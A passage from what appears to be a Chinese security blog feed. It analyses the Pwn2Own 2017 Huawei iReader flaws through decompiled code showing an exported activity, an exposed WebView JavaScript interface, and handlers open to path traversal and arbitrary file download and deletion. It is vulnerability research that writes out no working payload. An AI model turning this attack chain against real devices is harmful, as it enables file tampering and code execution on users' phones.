没有进行https通信,因此通过DNS欺骗劫持域名即可使该域名加载自己网页内容。(你没看错 这就没了 = =)</p><h3 id="0x03-漏洞总结"><a href="#0x03-漏洞总结" class="headerlink" title="0x03 漏洞总结"></a>0x03 漏洞总结</h3><ul><li><p>一开始由组件暴露的ThirdApiActivity作为切入点进行漏洞挖掘。</p></li><li><p>经过该类代码分析后，发现由getAction函数返回对应的action并由该具体的action执行onAction函数。这里第一部分我们可以控制的地方就是这个action的值。</p></li><li><p>紧接着进入onAction函数调用了handleUri,这部分我们可以控制的是activityName或activityUri，从而控制启动什么样的activity。(响应ACTION.VIEW)</p></li><li><p>而被启动的Activity调用onCreate函数处理我们可以控制的params参数。依此我们可以巧妙地构造攻击链。</p></li></ul><p>第二部分的漏洞分析敬请期待。</p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/huawei-mate9pro-pwn2own-write-up-final-2018-04-26.pdf">https://labs.mwrinfosecurity.com/assets/BlogFiles/huawei-mate9pro-pwn2own-write-up-final-2018-04-26.pdf </a></p><p><a href="https://www.cnblogs.com/whoislcj/p/5825333.html">Android业务组件化之URL Scheme使用</a></p><h3 id="0x05-声明"><a href="#0x05-声明" class="headerlink" title="0x05 声明"></a>0x05 声明</h3><p>本文章仅做学习研究用途，其他非法用途，本人概不负责。建议华为手机用户尽快更新HiApp以及IReader应用，以免遭到入侵控制，造成损失。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 简介&quot;&gt;&lt;/a&gt;0x01 简介&lt;/h3&gt;&lt;p&gt;ps:本文从攻击者的角度来分析如何发现Pwn2Own华为手机漏洞，但不代表与漏洞发现者的思路相同，仅供参考。本系列漏洞分析由于涉及大量代码分析，所以拆分为四部分，也比较容易阅读和理解消化。&lt;/p&gt;
&lt;p&gt;攻击视频详细可参见&lt;a href=&quot;https://www.thezdi.com/blog/2017/11/2/the-results-mobile-pwn2own-2017-day-two&quot;&gt;Pwn2own Blog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;官方公告: &lt;a href=&quot;http://www.huawei.com/en/psirt/security-advisories/huawei-sa-20171120-01-hwreader-en&quot;&gt;http://www.huawei.com/en/psirt/security-advisories/huawei-sa-20171120-01-hwreader-en&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;漏洞可直接造成任意目录遍历、删除、任意代码执行等高危操作&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Android漏洞" scheme="http://example.com/tags/Android%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Pwn2Own华为iReader漏洞原理与利用分析</title>
    <link href="http://example.com/2018/10/02/Pwn2Own%E5%8D%8E%E4%B8%BAiReader%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2018/10/02/Pwn2Own%E5%8D%8E%E4%B8%BAiReader%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</id>
    <published>2018-10-02T01:49:25.000Z</published>
    <updated>2021-05-22T13:10:54.207Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>这部分漏洞分析属于之前MWR InfoSecurity的研究员报告中的第三部分,同样该报告仅有漏洞的简单描述，具体的PoC也未详细给出.</p><p>因此本文的目的依旧是去探索漏洞挖掘的思路,以下不代表漏洞作者思路,欢迎更好的想法,欢迎讨论。</p><p>ps: 附上2017 pwn2own mobile视频</p><p><a href="https://youtu.be/4Oy7mBeOmDg">视频需梯子</a></p><span id="more"></span><h3 id="0x02-漏洞原理分析"><a href="#0x02-漏洞原理分析" class="headerlink" title="0x02 漏洞原理分析"></a>0x02 漏洞原理分析</h3><p>同样的挖掘思路,依旧是从<strong>AndroidManifest.xml</strong>入手,寻找暴露的组件,并进行代码静态分析。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:configChanges</span>=<span class="string">&quot;keyboardHidden|layoutDirection|navigation|orientation|screenLayout|screenSize|smallestScreenSize&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot; &quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.zhangyue.iReader.online.ui.ActivityWeb&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;portrait&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:host</span>=<span class="string">&quot;com.huawei.hwireader&quot;</span> <span class="attr">android:scheme</span>=<span class="string">&quot;hwireader&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.huawei.hwireader.GLOBAL_SEARCH_CLICKED&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> /&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>切入<strong>com.zhangyue.iReader.online.ui.ActivityWeb</strong>onCreate函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg8)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">this</span>.mCoverViewManager = <span class="keyword">new</span> OnlineCoverViewManager(((Context)<span class="keyword">this</span>), <span class="keyword">this</span>.k);</span><br><span class="line">        <span class="keyword">this</span>.mCoverViewManager.setOnlineActivityOperation(((IOnlineActivityOperation)<span class="keyword">this</span>));</span><br><span class="line">        <span class="keyword">this</span>.mOnlineCoverView = <span class="keyword">this</span>.mCoverViewManager.loadUrlOnNewCoverView(<span class="string">&quot;&quot;</span>, <span class="keyword">true</span>, <span class="keyword">this</span>.getWebViewType());</span><br><span class="line">        <span class="keyword">this</span>.mProgressWebView = <span class="keyword">this</span>.mOnlineCoverView.getProgressWebView();</span><br><span class="line">        <span class="keyword">this</span>.mWebView = <span class="keyword">this</span>.mProgressWebView.getWebView();<span class="comment">//获取webView实例类</span></span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> v0_1 = v2 == <span class="keyword">null</span> || !v2.containsKey(<span class="string">&quot;isload&quot;</span>) ? <span class="keyword">true</span> : v2.getBoolean(<span class="string">&quot;isload&quot;</span>);</span><br><span class="line">        String url = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(v2 != <span class="keyword">null</span> &amp;&amp; (v2.containsKey(<span class="string">&quot;url&quot;</span>))) &#123;</span><br><span class="line">            url = v2.getString(<span class="string">&quot;url&quot;</span>); <span class="comment">//获取url参数的值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!(<span class="keyword">this</span> <span class="keyword">instanceof</span> ActivityWeb)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(url != <span class="keyword">null</span> &amp;&amp; !url.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">this</span>.c(url); <span class="comment">// 加载url,最终调用loadRefreshUrl(String)函数</span></span><br><span class="line">                goto label_117;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.loadNaviURL(<span class="keyword">this</span>.c);</span><br><span class="line">            goto label_117;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 加载url,由参数uri控制</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">loadRefreshUrl</span><span class="params">(String arg2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.g = arg2;</span><br><span class="line">        ActivityOnline.mNeedClearHistory = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.mWebView != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mWebView.resetEmptySkip();</span><br><span class="line">            <span class="keyword">this</span>.mWebView.loadUrl(arg2);  <span class="comment">// 加载uri</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>分析onCreate函数代码来看(这里简化了大量代码,使得阅读更加容易)，这里主要是调用webView的loadUrl函数,那么我们自然需要找到webView的实例类,再切入分析.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CustomWebView <span class="title">getWebView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.mWebView;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用getWebView()函数返回<strong>CustomWebView</strong>类,因为这里仅仅是返回一个已初始化的类,因此,我们需要找到初始化该类的地方,即调用该类的构造函数。</p><p>完整的调用是<strong>this.mProgressWebView.getWebView()</strong>,自然我们需要切入mProgressWebView去寻找。我们直接查看引用,即可查找到webview初始化的地方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initWidgets</span><span class="params">(WebViewType arg5)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">this</span>.mWebView = WebViewFactory.createWebView(arg5, <span class="keyword">this</span>.mContext); 创建webview</span><br><span class="line">        <span class="keyword">this</span>.mWebView.setmIsLoadUrlInNewPage(<span class="keyword">this</span>.i);</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">this</span>.mWebView.setLoadUrlProcesser(((ILoadUrlProcesser)<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>查看该函数的引用链(jeb直接用x快捷键查找即可)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ProgressWebView</span><span class="params">(Context arg3)</span> </span>&#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">this</span>.init(WebViewType.COMMON_TYPE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(WebViewType arg4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.initWidgets(arg4); <span class="comment">//这里调用创建了webView       </span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">this</span>.mWebView.init(((OnWebViewEventListener)<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(OnWebViewEventListener arg2)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">this</span>.initJavaScript(); <span class="comment">//关键点</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initJavaScript</span><span class="params">()</span> </span>&#123;      </span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">this</span>.mJavascriptAction = <span class="keyword">new</span> JavascriptAction(((AbsDownloadWebView)<span class="keyword">this</span>));</span><br><span class="line">        WebSettings webSettings = <span class="keyword">this</span>.getSettings();</span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="keyword">true</span>); <span class="comment">// 允许执行JS代码</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">this</span>.addJavascriptInterface(<span class="keyword">this</span>.mJavascriptAction, <span class="string">&quot;ZhangYueJS&quot;</span>);<span class="comment">// JS接口</span></span><br><span class="line">    &#125;</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p>小结一下: </p><ul><li>  这里的思路是通过loadUrl最终跟踪webView实例类<strong>CustomWebView</strong>的初始化过程,从而发现initJavaScript函数中可以被调用的接口。</li><li><pre><code>但是,我觉得在审计中的思路这样可能比较死板,是不是在这里,直接审计CustomWebView类中的代码,寻找是否有javascript之类的关键词,再回溯去追寻，可能会更快发现。当然如果类代码过多的话,可能有点行不通，我自己在复现的时候，就是通过这种思路，直接找关键词再回溯。</code></pre></li></ul><p>接下来的思路自然是切入类<strong>JavascriptAction</strong>进行代码分析。</p><h4 id="任意文件下载-文件目录遍历"><a href="#任意文件下载-文件目录遍历" class="headerlink" title="任意文件下载/文件目录遍历"></a>任意文件下载/文件目录遍历</h4><p>快速浏览遍历**@JavascriptInterface<strong>注解的方法,其中</strong>do_command(String cmd)**自然引起注意。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@JavascriptInterface</span> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">do_command</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">    BookHighLight bookHignLight;</span><br><span class="line">    String url;</span><br><span class="line">    Activity mActivity;</span><br><span class="line">    Context mContext;</span><br><span class="line">    Activity currActivity;</span><br><span class="line">    LOG.E(<span class="string">&quot;dalongTest&quot;</span>, <span class="string">&quot;---------------------------do_command--------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.mAbsDowloadWebView == <span class="keyword">null</span> || !(<span class="keyword">this</span>.mAbsDowloadWebView.getContext() <span class="keyword">instanceof</span> Activity)) &#123;</span><br><span class="line">        currActivity = APP.getCurrActivity();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Context context_2 = <span class="keyword">this</span>.mAbsDowloadWebView.getContext();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((((Context)currActivity)) == <span class="keyword">null</span> || currActivity.getParent() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mContext = ((Context)currActivity);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        mActivity = currActivity.getParent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object obj = <span class="keyword">new</span> JSONTokener(cmd).nextValue();  <span class="comment">// 命令内容参数</span></span><br><span class="line">        String action = ((JSONObject)obj).getString(<span class="string">&quot;Action&quot;</span>);  <span class="comment">// 获取执行命令动作</span></span><br><span class="line">        LOG.I(<span class="string">&quot;js&quot;</span>, <span class="string">&quot;actionName:&quot;</span> + action);            </span><br><span class="line">        ...</span><br><span class="line">        JSONObject data = ((JSONObject)obj).getJSONObject(<span class="string">&quot;Data&quot;</span>);  <span class="comment">// 获取命令内容</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span>(action.equalsIgnoreCase(<span class="string">&quot;download&quot;</span>)) &#123;</span><br><span class="line">            JSProtocol.mJSBookProtocol.download(data, <span class="keyword">false</span>, <span class="keyword">false</span>); <span class="comment">//下载漏洞疑点</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(action.equalsIgnoreCase(<span class="string">&quot;chapPackDownload&quot;</span>)) &#123;</span><br><span class="line">                JSProtocol.mJSBookProtocol.onChapPack(data);<span class="comment">//删除漏洞疑点</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(action.equalsIgnoreCase(<span class="string">&quot;onlineReader&quot;</span>)) &#123;</span><br><span class="line">            JSProtocol.mJSBookProtocol.online(data); <span class="comment">//下载漏洞疑点</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(action.equalsIgnoreCase(<span class="string">&quot;readNow&quot;</span>)) &#123;</span><br><span class="line">            JSProtocol.mJSBookProtocol.readNow(data);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception v2_2) &#123;</span><br><span class="line">        LOG.E(<span class="string">&quot;js&quot;</span>, <span class="string">&quot;do_command error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于此方法中可执行的命令是非常多的，因此要进行代码审计,这里我认为的一个方式应该是在熟悉Android的一些漏洞，如任意文件下载/替换、任意目录遍历等等的漏洞原理,接着在审计代码的时候,可以快速地切入到可能存在漏洞点的代码进行分析。</p><p>这里的调用链路是online()–&gt;download()–&gt;originalDownload()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">originalDownload</span><span class="params">(JSONObject jsonObj, <span class="keyword">boolean</span> isCarToonParam2, <span class="keyword">boolean</span> flag_2)</span> </span>&#123;</span><br><span class="line">    downloadInfo = jsonObj.getJSONObject(<span class="string">&quot;DownloadInfo&quot;</span>);</span><br><span class="line">    ...</span><br><span class="line">    FrmAuth = downloadInfo.optBoolean(<span class="string">&quot;getDrmAuth&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">    fileName = PATH.getBookDir() + downloadInfo.getString(<span class="string">&quot;FileName&quot;</span>);  <span class="comment">// 直接获取json传过来的数据</span></span><br><span class="line">    fileId = downloadInfo.getInt(<span class="string">&quot;FileId&quot;</span>);</span><br><span class="line">    dowloadUrl = downloadInfo.getString(<span class="string">&quot;DownloadUrl&quot;</span>);  <span class="comment">// 可控制的下载地址</span></span><br><span class="line"> ...</span><br><span class="line"><span class="keyword">if</span>(isCarToonParam2) &#123;  <span class="comment">// 这里必须为true,否则fileName会被覆盖掉</span></span><br><span class="line">    d v3_2 = DBAdapter.getInstance().queryBookID(fileId);</span><br><span class="line">    <span class="keyword">if</span>(v3_2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] v1_3 = CartoonTool.getReadPaint(v3_2.j);</span><br><span class="line">        CartoonTool.openCartoon(fileId, v1_3[<span class="number">0</span>], v1_3[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    fileName = charging.optString(<span class="string">&quot;FeeType&quot;</span>);<span class="comment">//进入该分支,filename被覆盖</span></span><br><span class="line">    genreId = downloadInfo.optInt(<span class="string">&quot;FeeUnit&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fileName.equals(<span class="string">&quot;0&quot;</span>) &amp;&amp; genreId == <span class="number">10</span>) &#123;</span><br><span class="line">        CartoonHelper.setWholeBookPayed(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到,第二个参数传进来必须为True，才能避免fileName被覆盖,这也是为什么利用online函数而不利用download函数的原因.当然，我们在代码审计的时候肯定是先切入到download函数，分析完后再去寻找是否有符合利用条件的调用接口,很幸运地是,这里的online函数调用的第二个参数即为True.</p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>在JavaActionScript类中,还有Action为<strong>chapPackDownload</strong>存在漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onChapPack</span><span class="params">(JSONObject jsonObj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> v0_2;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> v3 = jsonObj.getInt(<span class="string">&quot;StartIndex&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> v4 = jsonObj.getInt(<span class="string">&quot;EndIndex&quot;</span>);</span><br><span class="line">        String v2 = jsonObj.getString(<span class="string">&quot;Price&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> v1 = jsonObj.getInt(<span class="string">&quot;BookId&quot;</span>);</span><br><span class="line">        String v5 = jsonObj.getString(<span class="string">&quot;PayURL&quot;</span>);</span><br><span class="line">        String v0_1 = jsonObj.getString(<span class="string">&quot;DownloadURL&quot;</span>);</span><br><span class="line">        String fileName = PATH.getBookDir() + jsonObj.getString(<span class="string">&quot;FileName&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>((FILE.isExist(PATH.getBookNameCheckOpenFail(fileName))) &amp;&amp; Device.getNetType() != -<span class="number">1</span>) &#123;</span><br><span class="line">            FILE.delete(PATH.getBookCachePathNamePostfix(fileName));</span><br><span class="line">            FILE.delete(fileName);<span class="comment">//没有进行名字校验,直接进行删除</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        x.i().a(v1, v2, v3, v4, v5, ManagerFileInternal.getInstance().appendInternalBookParam(v0_1, v1), fileName);</span><br><span class="line">        v0_2 = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">        v0.printStackTrace();</span><br><span class="line">        v0_2 = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0_2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析上面的代码可知,实际上FileName我们可以控制,只要满足**PATH.getBookNameCheckOpenFail(fileName)**该函数路径存在即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getBookNameCheckOpenFail</span><span class="params">(String arg2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PATH.getOpenFailDir() + MD5.getMD5(arg2);</span><br><span class="line">        <span class="comment">// /sdcard/HWiReader/books/.openfail/md5</span></span><br><span class="line">        <span class="comment">// /sdcard/Android/data/Huawei/HwReader/books/.openfail/md5</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getOpenFailDir</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> PATH.getWorkDir() + <span class="string">&quot;/books/.openfail/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getWorkDir</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SDCARD.getStorageDir() + PATH.HW_ROOT_DIR;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        PATH.PRI_HW_ROOT_DIR = &quot;HWiReader&quot;;</span></span><br><span class="line"><span class="comment">        PATH.HW_ROOT_DIR_ABOVE_EMUI6_0 = &quot;Android/data/Huawei/HwReader&quot;;</span></span><br><span class="line"><span class="comment">        PATH.HW_ROOT_DIR = PATH.PRI_HW_ROOT_DIR;</span></span><br><span class="line"><span class="comment">        